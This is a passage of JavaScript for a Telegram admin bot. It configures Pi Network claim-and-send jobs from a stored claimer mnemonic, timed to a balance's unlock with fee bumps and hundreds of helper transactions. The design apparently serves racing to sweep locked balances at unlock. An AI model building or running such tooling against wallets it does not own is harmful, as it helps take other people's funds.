    const callSubmit = publicCallSubmitSettings(settings);
    const language = publicTelegramLanguageSettings(settings);
    const lang = getTelegramLanguageText(language.telegram_language);
    const text = [
        `<b>${lang.homeTitle}</b>`,
        lang.homeIntro,
        "",
        `🌐 ${lang.languageNow}: <b>${language.label}</b>`,
        `${lang.timezone}: <b>${timezone.label}</b>`,
        `📡 Call Submit: <b>${callSubmit.submit_endpoint_mode}</b> / ${callSubmit.submit_before_ms}ms`,
        "",
        `${lang.server}: ${servers.length}`,
        `${lang.worker}: ${workers.length}`,
        `${lang.fundingWalletLabel}: ${wallets.length}`,
        `${lang.destinationWalletLabel}: ${destinations.length}`,
        `${lang.botTx}: ${bots.length}`,
    ].join("\n");
    const keyboard = telegramMainKeyboard(language.telegram_language);
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderTelegramSettings(chatId, editQuery = null) {
    const settings = await getSettings();
    const telegram = publicTelegramSettings(settings);
    const callSubmit = publicCallSubmitSettings(settings);
    const timezone = publicTimezoneSettings(settings);
    const language = publicTelegramLanguageSettings(settings);
    const lang = getTelegramLanguageText(language.telegram_language);
    const text = [
        `<b>${lang.settingsTitle}</b>`,
        `Telegram Token: ${telegram.has_bot_token ? escapeTelegramHtml(telegram.masked_bot_token) : lang.notSet}`,
        `Chat ID: <code>${escapeTelegramHtml(telegram.telegram_chat_id || "-")}</code>`,
        `Call Submit Mode: <b>${callSubmit.submit_endpoint_mode}</b>`,
        `Submit Before: <b>${callSubmit.submit_before_ms}ms</b>`,
        `${lang.timezone}: <b>${timezone.label}</b>`,
        `${lang.currentLanguage}: <b>${language.label}</b>`,
    ].join("\n");
    const keyboard = {
        inline_keyboard: [
            [
                { text: "MODE async", callback_data: "set:mode:async" },
                { text: "MODE sync", callback_data: "set:mode:sync" },
            ],
            [{ text: lang.setSubmitBeforeButton, callback_data: "input:submit_before" }],
            [{ text: lang.chooseLanguageButton, callback_data: "menu:language" }],
            [{ text: lang.setTelegramButton, callback_data: "input:telegram_settings" }],
            [{ text: lang.back, callback_data: "menu:home" }],
        ],
    };
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

async function renderTelegramTimezone(chatId, editQuery = null) {
    const settings = await getSettings();
    const timezone = publicTimezoneSettings(settings);
    const language = publicTelegramLanguageSettings(settings);
    const lang = getTelegramLanguageText(language.telegram_language);
    const rows = [];
    for (const zone of USER_TIMEZONE_OPTIONS) {
        const selected = zone === timezone.user_timezone ? "✅ " : "";
        rows.push({ text: `${selected}${formatTimezoneOffset(zone)}`, callback_data: `set:tz:${zone}` });
    }
    const keyboardRows = [];
    for (let index = 0; index < rows.length; index += 3) {
        keyboardRows.push(rows.slice(index, index + 3));
    }
    keyboardRows.push([{ text: lang.back, callback_data: "menu:settings" }]);
    const text = [
        `<b>${lang.timezoneTitle}</b>`,
        `${lang.now}: <b>${timezone.label}</b>`,
        lang.timezonePrompt,
    ].join("\n");
    const keyboard = { inline_keyboard: keyboardRows };
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

async function renderTelegramLanguage(chatId, editQuery = null) {
    const settings = await getSettings();
    const language = publicTelegramLanguageSettings(settings);
    const lang = getTelegramLanguageText(language.telegram_language);
    const rows = TELEGRAM_LANGUAGE_OPTIONS.map((option) => ([{
        text: `${option.code === language.telegram_language ? "✅ " : ""}${option.label}`,
        callback_data: `set:language:${option.code}`,
    }]));
    rows.push([{ text: lang.back, callback_data: "menu:settings" }]);
    const text = [
        `<b>${lang.languageTitle}</b>`,
        `${lang.languageNow}: <b>${language.label}</b>`,
        lang.languagePrompt,
    ].join("\n");
    const keyboard = { inline_keyboard: rows };
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

async function renderTelegramServers(chatId, editQuery = null, page = 0) {
    const [{ language, lang }, servers] = await Promise.all([
        getCurrentTelegramLanguageBundle(),
        listServersWithStats(),
    ]);
    const pageSize = getTelegramPageSize(TELEGRAM_LIST_PAGE_SIZE, 8, 3, 15);
    const pageInfo = getTelegramPage(page, servers.length, pageSize);
    const rows = servers.slice(pageInfo.start, pageInfo.end);
    const lines = [
        `<b>${lang.manageServers}</b>`,
        `Total: <b>${servers.length}</b>${servers.length ? ` | Halaman <b>${pageInfo.page + 1}/${pageInfo.totalPages}</b>` : ""}`,
        "",
    ];
    if (!servers.length) {
        lines.push(lang.noServers);
    } else {
        rows.forEach((server, index) => {
            const number = pageInfo.start + index + 1;
            const status = formatTelegramLatency(server.latency_status, server.latency_ms);
            const host = compactTelegramLogMessage(server.host || server.url || "-", 42);
            const name = compactTelegramLogMessage(server.name || "Server", 28);
            lines.push(`${number}. <b>${escapeTelegramHtml(name)}</b>`);
            lines.push(`   Host: <code>${escapeTelegramHtml(host)}</code> | Status: <b>${escapeTelegramHtml(status)}</b>`);
            lines.push(`   ${lang.id}: <code>${escapeTelegramHtml(formatTelegramShortId(server.id))}</code>${server.location ? ` | ${escapeTelegramHtml(compactTelegramLogMessage(server.location, 24))}` : ""}`);
        });
    }
    const keyboard = buildTelegramListKeyboard({
        callbackPrefix: "servers",
        pageInfo,
        refreshText: lang.refresh,
        refreshCallback: `servers:page:${pageInfo.page}`,
        backText: lang.back,
        backCallback: "menu:home",
        extraRows: [
            [{ text: lang.addServer, callback_data: "input:add_server" }],
            [{ text: lang.deleteServer, callback_data: "delete_menu:servers" }],
        ],
    });
    const text = lines.join("\n");
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

async function renderTelegramFunding(chatId, editQuery = null, page = 0) {
    const [{ language, lang }, wallets] = await Promise.all([
        getCurrentTelegramLanguageBundle(),
        listWalletsWithBalances(),
    ]);
    const pageSize = getTelegramPageSize(TELEGRAM_LIST_PAGE_SIZE, 8, 3, 15);
    const pageInfo = getTelegramPage(page, wallets.length, pageSize);
    const rows = wallets.slice(pageInfo.start, pageInfo.end);
    const lines = [
        `<b>${lang.manageFunding}</b>`,
        `Total: <b>${wallets.length}</b>${wallets.length ? ` | Halaman <b>${pageInfo.page + 1}/${pageInfo.totalPages}</b>` : ""}`,
        "",
    ];
    if (!wallets.length) {
        lines.push(lang.noFundingWallet);
    } else {
        rows.forEach((wallet, index) => {
            const number = pageInfo.start + index + 1;
            const name = compactTelegramLogMessage(wallet.name || "Funding", 30);
            lines.push(`${number}. <b>${escapeTelegramHtml(name)}</b>`);
            lines.push(`   ${lang.publicKey}: <code>${escapeTelegramHtml(shortKey(wallet.public_key, 8))}</code>`);
            lines.push(`   ${lang.balance}: <b>${escapeTelegramHtml(wallet.balance_pi || "-")}</b> PI | ${lang.id}: <code>${escapeTelegramHtml(formatTelegramShortId(wallet.id))}</code>`);
            if (wallet.balance_status && wallet.balance_status !== "ok") {
                const walletInfo = compactTelegramLogMessage(wallet.balance_error || "", 64);
                lines.push(`   Info: <b>${escapeTelegramHtml(formatTelegramStatus(wallet.balance_status))}</b>${walletInfo && walletInfo !== "-" ? ` - ${escapeTelegramHtml(walletInfo)}` : ""}`);
            }
        });
    }
    const keyboard = buildTelegramListKeyboard({
        callbackPrefix: "funding",
        pageInfo,
        refreshText: lang.refresh,
        refreshCallback: `funding:page:${pageInfo.page}`,
        backText: lang.back,
        backCallback: "menu:home",
        extraRows: [
            [{ text: lang.addFunding, callback_data: "input:add_funding" }],
            [{ text: lang.deleteFunding, callback_data: "delete_menu:funding" }],
        ],
    });
    const text = lines.join("\n");
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

async function renderTelegramDestinations(chatId, editQuery = null, page = 0) {
    const [{ language, lang }, destinations] = await Promise.all([
        getCurrentTelegramLanguageBundle(),
        listDestinations(),
    ]);
    const pageSize = getTelegramPageSize(TELEGRAM_LIST_PAGE_SIZE, 8, 3, 15);
    const pageInfo = getTelegramPage(page, destinations.length, pageSize);
    const rows = destinations.slice(pageInfo.start, pageInfo.end);
    const lines = [
        `<b>${lang.manageDestinations}</b>`,
        `Total: <b>${destinations.length}</b>${destinations.length ? ` | Halaman <b>${pageInfo.page + 1}/${pageInfo.totalPages}</b>` : ""}`,
        "",
    ];
    if (!destinations.length) {
        lines.push(lang.noDestinations);
    } else {
        rows.forEach((destination, index) => {
            const number = pageInfo.start + index + 1;
            const name = compactTelegramLogMessage(destination.name || "Wallet", 30);
            lines.push(`${number}. <b>${escapeTelegramHtml(name)}</b>`);
            lines.push(`   Wallet: <code>${escapeTelegramHtml(shortKey(destination.address, 8))}</code> | ${lang.id}: <code>${escapeTelegramHtml(formatTelegramShortId(destination.id))}</code>`);
        });
    }
    const keyboard = buildTelegramListKeyboard({
        callbackPrefix: "destinations",
        pageInfo,
        refreshText: lang.refresh,
        refreshCallback: `destinations:page:${pageInfo.page}`,
        backText: lang.back,
        backCallback: "menu:home",
        extraRows: [
            [{ text: lang.addDestination, callback_data: "input:add_destination" }],
            [{ text: lang.deleteDestination, callback_data: "delete_menu:destinations" }],
        ],
    });
    const text = lines.join("\n");
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}


async function renderTelegramBump(chatId, editQuery = null, page = 0) {
    const [{ language, lang }, bumpWallets] = await Promise.all([
        getCurrentTelegramLanguageBundle(),
        listBumpWallets(),
    ]);
    const pageSize = getTelegramPageSize(TELEGRAM_LIST_PAGE_SIZE, 8, 3, 15);
    const pageInfo = getTelegramPage(page, bumpWallets.length, pageSize);
    const rows = bumpWallets.slice(pageInfo.start, pageInfo.end);
    const lines = [
        `<b>${escapeTelegramHtml(lang.manageBump || "💼 Manage Bump")}</b>`,
        `File: <code>bump.txt</code>`,
        `Total: <b>${bumpWallets.length}</b>${bumpWallets.length ? ` | Halaman <b>${pageInfo.page + 1}/${pageInfo.totalPages}</b>` : ""}`,
        "",
    ];
    if (!bumpWallets.length) {
        lines.push(lang.noBumpWallet || "Belum ada wallet di bump.txt.");
    } else {
        rows.forEach((wallet, index) => {
            const number = pageInfo.start + index + 1;
            lines.push(`${number}. ${wallet.valid ? "✅" : "❌"} <code>${escapeTelegramHtml(wallet.short_public_key || "-")}</code>`);
            if (!wallet.valid && wallet.error) {
                lines.push(`   Error: ${escapeTelegramHtml(compactTelegramLogMessage(wallet.error, 60))}`);
            }
        });
    }
    const extraRows = [
        [
            { text: lang.addBumpWallet || "➕ Add Bump", callback_data: "input:add_bump" },
            { text: lang.uploadBumpTxt || "📤 Upload bump.txt", callback_data: "input:upload_bump" },
        ],
        [{ text: lang.showBumpWallet || "👁️ Show Bump", callback_data: `bump:page:${pageInfo.page}` }],
    ];
    if (bumpWallets.length) {
        extraRows.push([{ text: lang.deleteAllBumpWallet || "🧹 Delete All Bump", callback_data: "bump:clear:confirm" }]);
        const deleteButtons = rows.map((wallet, index) => ({ text: `🗑️ #${pageInfo.start + index + 1}`, callback_data: `bump:del:${wallet.index}` }));
        for (let index = 0; index < deleteButtons.length; index += 4) {
            extraRows.push(deleteButtons.slice(index, index + 4));
        }
    }
    const keyboard = buildTelegramListKeyboard({
        callbackPrefix: "bump",
        pageInfo,
        refreshText: lang.refresh,
        refreshCallback: `bump:page:${pageInfo.page}`,
        backText: lang.back,
        backCallback: "menu:home",
        extraRows,
    });
    const text = lines.join("\n");
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

async function renderTelegramWorkers(chatId, editQuery = null, page = 0) {
    const [{ language, lang }, workers] = await Promise.all([
        getCurrentTelegramLanguageBundle(),
        listWorkers(),
    ]);
    const pageSize = getTelegramPageSize(TELEGRAM_LIST_PAGE_SIZE, 8, 3, 15);
    const pageInfo = getTelegramPage(page, workers.length, pageSize);
    const rows = workers.slice(pageInfo.start, pageInfo.end);
    const lines = [
        `<b>${lang.manageWorkers}</b>`,
        `Total: <b>${workers.length}</b>${workers.length ? ` | Halaman <b>${pageInfo.page + 1}/${pageInfo.totalPages}</b>` : ""}`,
        "",
    ];
    if (!workers.length) {
        lines.push(lang.noWorkers);
    } else {
        rows.forEach((worker, index) => {
            const number = pageInfo.start + index + 1;
            const name = compactTelegramLogMessage(worker.name || "Worker", 28);
            const serverName = compactTelegramLogMessage(worker.server_name || lang.unassigned, 28);
            const host = formatTelegramHost(worker.server_url);
            lines.push(`${number}. <b>${escapeTelegramHtml(name)}</b> → <b>${escapeTelegramHtml(serverName)}</b>`);
            lines.push(`   Host: <code>${escapeTelegramHtml(host)}</code> | Port: <b>${escapeTelegramHtml(worker.port || worker.worker_port || "-")}</b> | PM2: <code>${escapeTelegramHtml(worker.pm2_name || normalizePm2WorkerName(worker.name))}</code>`);
            lines.push(`   ${lang.id}: <code>${escapeTelegramHtml(formatTelegramShortId(worker.id))}</code>${worker.pm2_status === "error" ? ` | ⚠️ ${escapeTelegramHtml(compactTelegramLogMessage(worker.pm2_error || "PM2 error", 50))}` : ""}`);
        });
    }
    const keyboard = buildTelegramListKeyboard({
        callbackPrefix: "workers",
        pageInfo,
        refreshText: lang.refresh,
        refreshCallback: `workers:page:${pageInfo.page}`,
        backText: lang.back,
        backCallback: "menu:home",
        extraRows: [
            [{ text: lang.addWorker, callback_data: "worker:add:pick_server" }],
            [{ text: lang.deleteWorker, callback_data: "delete_menu:workers" }],
        ],
    });
    const text = lines.join("\n");
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}

async function renderTelegramBots(chatId, editQuery = null, page = 0) {
    const [{ language, lang }, bots] = await Promise.all([
        getCurrentTelegramLanguageBundle(),
        listBots(),
    ]);
    const pageSize = getTelegramPageSize(TELEGRAM_LIST_PAGE_SIZE, 6, 3, 10);
    const pageInfo = getTelegramPage(page, bots.length, pageSize);
    const rows = bots.slice(pageInfo.start, pageInfo.end);
    const lines = [
        `<b>${lang.botTx}</b>`,
        `Total: <b>${bots.length}</b>${bots.length ? ` | Halaman <b>${pageInfo.page + 1}/${pageInfo.totalPages}</b>` : ""}`,
        "",
    ];
    if (!bots.length) {
        lines.push(lang.noBots);
    } else {
        rows.forEach((bot, index) => {
            const number = pageInfo.start + index + 1;
            const feeLoss = bot.funding_fee_loss_pi ?? bot.fee_loss_pi ?? "-";
            const name = compactTelegramLogMessage(bot.bot_name || bot.id || "Bot", 34);
            const parent = bot.parent_bot_name ? ` | ${lang.parent}: ${escapeTelegramHtml(compactTelegramLogMessage(bot.parent_bot_name, 22))}` : "";
            lines.push(`${number}. <b>${escapeTelegramHtml(name)}</b> | <b>${escapeTelegramHtml(formatTelegramBotStatus(bot.status))}</b>${parent}`);
            lines.push(`   ${lang.worker}: <b>${escapeTelegramHtml(bot.worker_name || "-")}</b> | ${lang.server}: ${escapeTelegramHtml(compactTelegramLogMessage(bot.server_name || "-", 24))}`);
            lines.push(`   Helpers: <code>${escapeTelegramHtml(bot.helper_range || "-")}</code> | ${lang.network}: ${escapeTelegramHtml(bot.network || "-")} | ${lang.mode}: ${escapeTelegramHtml(telegramTransactionModeLabel(bot.transaction_mode))}`);
            lines.push(`   ${lang.type}: ${escapeTelegramHtml(telegramTxTypeLabel(bot.transaction_type))} | ${lang.amount}: ${escapeTelegramHtml(bot.amount || "-")}`);
            lines.push(`   ${lang.time}: <code>${escapeTelegramHtml(bot.unlock_time || "-")}</code>`);
            lines.push(`   ${lang.feeLoss}: <b>${escapeTelegramHtml(typeof formatFeeLossPi === "function" ? formatFeeLossPi(feeLoss) : feeLoss)}</b> PI`);
        });
    }
    const keyboard = buildTelegramListKeyboard({
        callbackPrefix: "bots",
        pageInfo,
        refreshText: lang.refresh,
        refreshCallback: `bots:page:${pageInfo.page}`,
        backText: lang.back,
        backCallback: "menu:home",
        extraRows: [
            [{ text: lang.setNewBot, callback_data: "botnew:start" }],
            [{ text: lang.advancedJson, callback_data: "input:add_bot_json" }],
            [{ text: lang.deleteBot, callback_data: "delete_menu:bots" }],
        ],
    });
    const text = lines.join("\n");
    if (editQuery) {
        return telegramEditOrSend(editQuery, text, keyboard);
    }
    return telegramSend(chatId, text, keyboard);
}


const TELEGRAM_TX_TYPE_OPTIONS = [
    { value: "claim_only", label: "Claim Only", button: "Claim Only" },
    { value: "send_only", label: "Send Only", button: "Send Only" },
    { value: "claim_and_send", label: "Claim & Send", button: "Claim & Send" },
];

const TELEGRAM_TRANSACTION_MODE_OPTIONS = [
    { value: "fee_bump", label: "Bump" },
    { value: "normal", label: "Normal" },
];

const TELEGRAM_HELPER_RANGE_OPTIONS = [
    { value: "1-20", label: "20Tx" },
    { value: "1-50", label: "50Tx" },
    { value: "1-100", label: "100Tx" },
    { value: "1-200", label: "200Tx" },
    { value: "1-300", label: "300Tx" },
    { value: "1-400", label: "400Tx" },
    { value: "1-500", label: "500Tx" },
    { value: "1-600", label: "600Tx" },
    { value: "1-700", label: "700Tx" },
    { value: "1-800", label: "800Tx" },
    { value: "1-900", label: "900Tx" },
    { value: "1-1000", label: "1000Tx" },
    { value: "1-10", label: "1 - 10" },
    { value: "101-200", label: "101 - 200" },
    { value: "201-300", label: "201 - 300" },
    { value: "301-400", label: "301 - 400" },
    { value: "401-500", label: "401 - 500" },
    { value: "501-600", label: "501 - 600" },
    { value: "601-700", label: "601 - 700" },
    { value: "701-800", label: "701 - 800" },
    { value: "801-900", label: "801 - 900" },
    { value: "901-1000", label: "901 - 1000" },
];

const TELEGRAM_FEE_OPTIONS = ["0.04", "0.07", "0.2", "0.3", "0.7", "1.7", "2.7", "4.5", "5.4", "6.5"];
const TELEGRAM_TOPUP_TARGET_OPTIONS = ["0.07", "0.10", "0.20", "0.50"];

function telegramTxTypeLabel(value) {
    const found = TELEGRAM_TX_TYPE_OPTIONS.find((item) => item.value === value);
    return found ? found.label : String(value || "-");
}

function telegramTransactionModeLabel(value) {
    const found = TELEGRAM_TRANSACTION_MODE_OPTIONS.find((item) => item.value === value);
    return found ? found.label : String(value || "-");
}

function formatFeeLossPi(value) {
    const parsed = Number.parseFloat(String(value ?? "").replace(/[^0-9.-]/g, ""));
    return Number.isFinite(parsed) ? parsed.toFixed(7) : String(value ?? "-");
}

function newBotNeedsDestination(data) {
    return data.transaction_type === "send_only" || data.transaction_type === "claim_and_send";
}

function newBotNeedsManualAmount(data) {
    return data.transaction_type === "send_only";
}

function newBotNeedsClaimable(data) {
    return data.transaction_type === "claim_only" || data.transaction_type === "claim_and_send";
}

function getNewBotWizard(chatId) {
    const state = telegramControlState.pendingInputs.get(String(chatId));
    return state && state.action === "bot_wizard" ? state : null;
}

function saveNewBotWizard(chatId, state) {
    telegramControlState.pendingInputs.set(String(chatId), {
        ...state,
        action: "bot_wizard",
        updated_at: Date.now(),
    });
}

async function defaultNewBotData() {
    const settings = await getSettings().catch(() => ({}));
    return {
        transaction_type: "claim_and_send",
        bot_name: "",
        worker_name: null,
        worker_label: "Auto Worker",
        auto_distribute_helpers: true,
        network: "mainnet",
        transaction_mode: "fee_bump",
        helper_range: "1-50",
        claimer_mnemonic: "",
        claimer_public_key: "",
        destination: null,
        destination_label: "-",
        amount: "",
        unlock_time: "",
        outer_fee: "0.04",
        fee_payer_id: "",
        fee_payer_label: "-",
        claimable_balance_id: null,
        claimable_balance_ids: [],
        claimable_cache: [],
        selected_claimable_indexes: [],
        custom_memo: "AUTO",
        topup_helpers: false,
        topup_target_balance: "0.07",
        sweep_helpers: false,
        recover_fees: false,
        recover_fee_delay: 7,
        user_timezone: normalizeUserTimezone(settings.user_timezone, 0),
        status: "active",
    };
}

function getSelectedClaimables(data) {
    const cache = Array.isArray(data.claimable_cache) ? data.claimable_cache : [];
    const indexes = Array.isArray(data.selected_claimable_indexes) ? data.selected_claimable_indexes : [];
    return indexes.map((index) => cache[index]).filter(Boolean);
}

function getSelectedClaimableIds(data) {
    const cachedIds = getSelectedClaimables(data).map((item) => item.id).filter(Boolean);
    const manualIds = Array.isArray(data.claimable_balance_ids) ? data.claimable_balance_ids : [];
    return cachedIds.length ? cachedIds : manualIds;
}

function getSelectedClaimableTotalPi(data) {
    const selected = getSelectedClaimables(data);
    let total = 0;
    for (const balance of selected) {
        const asset = String(balance?.asset || "PI").toUpperCase();
        if (asset !== "PI" && asset !== "NATIVE") {
            continue;
        }
        const amount = Number.parseFloat(balance?.amount);
        if (Number.isFinite(amount) && amount > 0) {
            total += amount;
        }
    }
    return total > 0 ? total.toFixed(7) : "";
}

async function fetchClaimableAmountForTelegram(balanceId, network = "mainnet") {
    const apiUrl = String(network).toLowerCase() === "testnet"
        ? "https://api.testnet.minepi.com"
        : "https://api.mainnet.minepi.com";
    const response = await axios.get(`${apiUrl}/claimable_balances/${encodeURIComponent(balanceId)}`, { timeout: 15000 });
    const record = response.data || {};
    const asset = record.asset === "native" ? "PI" : String(record.asset || "");
    if (asset && asset !== "PI") {
        throw new Error(`Balance ID ${String(balanceId).slice(0, 12)}... bukan native PI`);
    }
    const amount = Number.parseFloat(record.amount);
    if (!Number.isFinite(amount) || amount <= 0) {
        throw new Error(`Amount Balance ID ${String(balanceId).slice(0, 12)}... tidak valid`);
    }
    return amount;
}

async function resolveClaimAndSendAmountFromClaimables(data) {
    if (data.transaction_type !== "claim_and_send") {
        return data.amount || "";
    }

    const selectedIds = getSelectedClaimableIds(data);
    if (!selectedIds.length) {
        throw new Error("Claim & Send wajib memilih minimal 1 claimable balance supaya amount bisa otomatis terdeteksi");
    }

    const selected = getSelectedClaimables(data);
    const knownAmounts = new Map();
    for (const balance of selected) {
        const id = String(balance?.id || "").trim();
        if (!id) continue;
        const asset = String(balance?.asset || "PI").toUpperCase();
        if (asset !== "PI" && asset !== "NATIVE") {
            throw new Error(`Claimable ${id.slice(0, 12)}... bukan native PI`);
        }
        const amount = Number.parseFloat(balance?.amount);
        if (Number.isFinite(amount) && amount > 0) {
            knownAmounts.set(id, amount);
        }
    }

    let total = 0;
    for (const id of selectedIds) {
        if (knownAmounts.has(id)) {
            total += knownAmounts.get(id);
        } else {
            total += await fetchClaimableAmountForTelegram(id, data.network || "mainnet");
        }
    }

    if (!Number.isFinite(total) || total <= 0) {
        throw new Error("Total amount dari claimable balance tidak valid");
    }
    return total.toFixed(7);
}

function parseTelegramClaimableIds(text) {
    return String(text || "")
        .split(/[\s,;]+/)
        .map((item) => item.trim())
        .filter(Boolean)
        .filter((item, index, array) => array.indexOf(item) === index);
}

function parseClaimableUnlockDateForTelegram(balance, userTimezone = 0) {
    const rawUtc = String(balance?.unlock_time_utc || "").trim();
    if (rawUtc) {
        const utcDate = new Date(rawUtc);
        if (!Number.isNaN(utcDate.getTime())) {
            return new Date(utcDate.getTime() + Number(userTimezone || 0) * 60 * 60 * 1000);
        }
    }

    const unlockTime = String(balance?.unlock_time || "");
    if (!unlockTime || unlockTime === "Immediately" || unlockTime.includes("Before")) {
        return null;
    }
    const parts = unlockTime.split(/[- :]/).map(Number);
    if (parts.length < 6 || !parts.every(Number.isFinite)) {
        return null;
    }
    // unlock_time yang tidak punya unlock_time_utc dianggap UTC, lalu ditampilkan sesuai timezone setting admin.
    const utcDate = new Date(Date.UTC(parts[0], parts[1] - 1, parts[2], parts[3], parts[4], parts[5]));
    return new Date(utcDate.getTime() + Number(userTimezone || 0) * 60 * 60 * 1000);
}

function formatTelegramDateParts(date) {
    return `${date.getUTCFullYear()}-${String(date.getUTCMonth() + 1).padStart(2, "0")}-${String(date.getUTCDate()).padStart(2, "0")} ${String(date.getUTCHours()).padStart(2, "0")}:${String(date.getUTCMinutes()).padStart(2, "0")}:${String(date.getUTCSeconds()).padStart(2, "0")}`;
}

function formatLocalUnlockAfterMs(ms, userTimezone = 0) {
    return formatTelegramDateParts(new Date(Date.now() + Number(userTimezone || 0) * 60 * 60 * 1000 + ms));
}

function getUnlockTimeFromSelectedClaimables(data) {
    const dates = getSelectedClaimables(data)
        .map((balance) => parseClaimableUnlockDateForTelegram(balance, data.user_timezone))
        .filter((date) => date && Number.isFinite(date.getTime()));
    if (!dates.length) {
        return null;
    }
    return formatTelegramDateParts(new Date(Math.max(...dates.map((date) => date.getTime()))));
}

function validateTelegramPiAmount(text, label = "Amount") {
    const value = String(text || "").trim();
    if (!/^\d+(?:\.\d{1,7})?$/.test(value) || Number.parseFloat(value) <= 0) {
        throw new Error(`${label} harus angka PI positif, maksimal 7 desimal`);
    }
    return Number.parseFloat(value).toFixed(7);
}

function validateTelegramUnlockTime(text) {
    const value = String(text || "").trim();
    if (!/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(value)) {
        throw new Error("Format unlock wajib YYYY-MM-DD HH:mm:ss");
    }
    if (Number.isNaN(new Date(value).getTime())) {
        throw new Error("Unlock time tidak valid");
    }
    return value;
}

function newBotCancelKeyboard() {
    return { inline_keyboard: [[{ text: "❌ Batal", callback_data: "botnew:cancel" }], [{ text: "⬅️ Bot TX", callback_data: "menu:bots" }]] };
}

async function startNewBotWizard(chatId, editQuery = null) {
    const data = await defaultNewBotData();
    const state = { action: "bot_wizard", step: "type", data, created_at: Date.now() };
    saveNewBotWizard(chatId, state);
    return renderNewBotTypePicker(chatId, editQuery, state);
}

async function renderNewBotTypePicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId) || { data: await defaultNewBotData() };
    state.step = "type";
    saveNewBotWizard(chatId, state);
    const rows = TELEGRAM_TX_TYPE_OPTIONS.map((item) => [{
        text: `${state.data.transaction_type === item.value ? "✅ " : ""}${item.button}`,
        callback_data: `botnew:type:${item.value}`,
    }]);
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const text = [
        "<b>➕ Set New Bot</b>",
        "Pilih jenis transaksi:",
        "• Claim Only",
        "• Send Only",
        "• Claim & Send",
    ].join("\n");
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function promptNewBotName(chatId, callbackQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, callbackQuery);
    state.step = "name";
    saveNewBotWizard(chatId, state);
    const text = [
        "<b>➕ Set New Bot</b>",
        `Type: <b>${escapeTelegramHtml(telegramTxTypeLabel(state.data.transaction_type))}</b>`,
        "",
        "Kirim <b>Name</b> bot.",
        "Contoh: <code>BOT-1</code>",
    ].join("\n");
    return callbackQuery ? telegramEditOrSend(callbackQuery, text, newBotCancelKeyboard()) : telegramSend(chatId, text, newBotCancelKeyboard());
}

async function renderNewBotWorkerPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "worker";
    saveNewBotWizard(chatId, state);
    const workers = sortWorkersByName(await listWorkers());
    const rows = [[{ text: `${state.data.auto_distribute_helpers ? "✅ " : ""}Auto Worker`, callback_data: "botnew:worker:auto" }]];
    workers.slice(0, 30).forEach((worker) => {
        rows.push([{ text: `${state.data.worker_name === worker.name ? "✅ " : ""}${worker.name}`, callback_data: `botnew:worker:${worker.id}` }]);
    });
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const text = [
        "<b>Worker</b>",
        `Bot: <b>${escapeTelegramHtml(state.data.bot_name)}</b>`,
        "Pilih worker.",
        "Auto Worker = auto distribute helper range ke Worker1, Worker2, dst.",
    ].join("\n");
    const keyboard = { inline_keyboard: rows };
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderNewBotNetworkPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "network";
    saveNewBotWizard(chatId, state);
    const keyboard = {
        inline_keyboard: [
            [
                { text: `${state.data.network === "mainnet" ? "✅ " : ""}Mainnet`, callback_data: "botnew:network:mainnet" },
                { text: `${state.data.network === "testnet" ? "✅ " : ""}Testnet`, callback_data: "botnew:network:testnet" },
            ],
            [{ text: "❌ Batal", callback_data: "botnew:cancel" }],
        ],
    };
    const text = "<b>Network</b>\nPilih network untuk bot.";
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderNewBotTransactionModePicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "transaction_mode";
    saveNewBotWizard(chatId, state);
    const keyboard = {
        inline_keyboard: [
            [
                { text: `${state.data.transaction_mode === "fee_bump" ? "✅ " : ""}Bump`, callback_data: "botnew:tmode:fee_bump" },
                { text: `${state.data.transaction_mode === "normal" ? "✅ " : ""}Normal`, callback_data: "botnew:tmode:normal" },
            ],
            [{ text: "❌ Batal", callback_data: "botnew:cancel" }],
        ],
    };
    const text = [
        "<b>Mode</b>",
        "Bump = fee bump.",
        "Normal = top up dan sweep helper bisa aktif.",
    ].join("\n");
    return editQuery ? telegramEditOrSend(editQuery, text, keyboard) : telegramSend(chatId, text, keyboard);
}

async function renderNewBotHelperPicker(chatId, editQuery = null, state = null) {
    state = state || getNewBotWizard(chatId);
    if (!state) return startNewBotWizard(chatId, editQuery);
    state.step = "helpers";
    saveNewBotWizard(chatId, state);
    const buttons = TELEGRAM_HELPER_RANGE_OPTIONS.map((item) => ({
        text: `${state.data.helper_range === item.value ? "✅ " : ""}${item.label}`,
        callback_data: `botnew:helpers:${item.value}`,
    }));
    const rows = chunkTelegramButtons(buttons, 2);
    rows.push([{ text: "❌ Batal", callback_data: "botnew:cancel" }]);
    const text = [
        "<b>Sponsors / Helpers</b>",
